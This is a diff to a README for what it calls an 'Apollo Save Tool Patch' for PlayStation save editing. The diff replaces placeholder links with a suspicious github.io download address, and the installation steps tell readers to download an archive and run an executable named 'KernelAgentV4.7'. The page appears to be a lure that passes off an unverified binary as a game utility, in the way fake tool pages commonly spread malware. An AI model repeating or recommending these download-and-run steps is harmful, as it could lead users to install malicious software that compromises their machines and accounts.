@@ -2,13 +2,15 @@
 
 Unlock full editing access to PS3, PS4, and PS5 save files with Apollo Save Tool. This patch enhances stability, fixes USB/profile detection bugs, and enables profile-free resigning using `KernelAgentV4.7`.
 
-[![Download Apollo Patch](https://img.shields.io/badge/Download-Apollo_Save_Tool_Patch-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Apollo Patch](https://img.shields.io/badge/Download-Apollo_Save_Tool_Patch-blueviolet)](https://apollo-save-tool-patch-ps3-ps4-ps5.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://apollo-save-tool-patch-ps3-ps4-ps5.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\ApolloFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will auto-detect Apollo Save Tool and patch save/profile access layers  
